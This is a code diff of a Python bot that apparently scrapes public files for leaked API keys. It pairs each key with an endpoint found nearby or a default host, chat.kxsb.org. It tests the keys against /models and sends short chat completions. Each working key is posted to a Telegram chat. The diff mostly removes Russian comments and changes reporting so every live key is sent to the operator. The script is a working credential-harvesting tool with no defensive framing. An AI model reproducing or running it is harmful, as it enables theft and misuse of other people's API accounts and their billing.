@@ -29,7 +29,7 @@ KEY_PATTERNS = [
     {"provider": "generic-sk",  "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
 ]
 
-# Паттерн для поиска URL эндпоинтов (ищем ссылки, заканчивающиеся на /v1 или содержащие api)
+# Паттерн для поиска URL
 URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')
 
 def identify_key(token):
@@ -62,30 +62,23 @@ def fetch_targets():
             if file_resp.status_code == 200:
                 text = file_resp.text
                 
-                # 1. Ищем URL (эндпоинты) в файле
                 urls = URL_REGEX.findall(text)
-                # Очищаем от мусора (гитхаб, документация и т.д.)
                 valid_urls = [u for u in urls if 'github.com' not in u and 'telegram' not in u and 'w3.org' not in u]
-                # Ищем именно API-эндпоинты (обычно заканчиваются на /v1)
                 api_urls = [u for u in valid_urls if u.endswith('/v1') or '/v1/' in u]
                 
                 if not api_urls and valid_urls:
-                    api_urls = valid_urls[:1] # Если нет /v1, берем первый попавшийся URL
+                    api_urls = valid_urls[:1]
 
-                # 2. Ищем ключи
                 for p in KEY_PATTERNS:
                     for match in p["regex"].finditer(text):
                         token = match.group(0)
-                        # Если в файле есть URL, привязываем ключ к нему
                         if api_urls:
-                            for url in api_urls[:3]: # Максимум 3 урла на файл
+                            for url in api_urls[:3]:
                                 targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
                         else:
-                            # Если URL нет, пробуем дефолтный
                             targets.append({"key": token, "endpoint": "https://chat.kxsb.org/api/v1", "provider": p["provider"]})
             time.sleep(1)
             
-        # Убираем дубликаты
         unique_targets = []
         seen = set()
         for t in targets:
@@ -101,7 +94,6 @@ def fetch_targets():
         return []
 
 def check_endpoint(api_key, endpoint):
-    """Проверяет каталог /models на указанном эндпоинте"""
     try:
         resp = requests.get(f"{endpoint}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
         if resp.status_code == 200:
@@ -111,7 +103,6 @@ def check_endpoint(api_key, endpoint):
     return []
 
 def probe_models(api_key, endpoint, models):
-    """Тестирует модели на указанном эндпоинте"""
     results = []
     for model in models[:7]:
         payload = {"model": model, "messages": [{"role": "user", "content": "pong"}], "max_tokens": 5}
@@ -129,7 +120,7 @@ def probe_models(api_key, endpoint, models):
 def format_report(key, endpoint, models, probes):
     working = [p for p in probes if p["ok"]]
     if not working:
-        return None # Не отправляем, если ни одна модель не работает
+        return None
         
     lines = [
         "🔑 Новый ключ",
@@ -140,7 +131,6 @@ def format_report(key, endpoint, models, probes):
     ]
     
     for p in working:
-        # Пример: gpt-4o-mini — 1.6s, 5 tok/s (pong)
         lines.append(f"{p['model']} — {p['latency']}s (pong)")
         
     lines.append(f"📦 Все модели — " + ", ".join(models[:5]))
@@ -174,12 +164,15 @@ async def run_scan():
         report = format_report(key, endpoint, models, probes)
         if report:
             working_count += 1
-                # Отчет о завершении, чтобы ты знал, что бот отработал
-                if CHAT_ID:
-                    await app.bot.send_message(chat_id=CHAT_ID, text=f"🤖 Скан завершен. Проверено целей: {len(targets)}. Рабочих: {working_count}")
+            if CHAT_ID:
+                await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
             logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
         else:
             logger.info("   └ Мертвый (все пробы 401/403)")
+
+    # Отчет о завершении
+    if CHAT_ID:
+        await app.bot.send_message(chat_id=CHAT_ID, text=f"🤖 Скан завершен. Проверено целей: {len(targets)}. Рабочих: {working_count}")
 
     logger.info(f"✅ Сессия завершена. Отправлено рабочих ключей: {working_count}.")
 
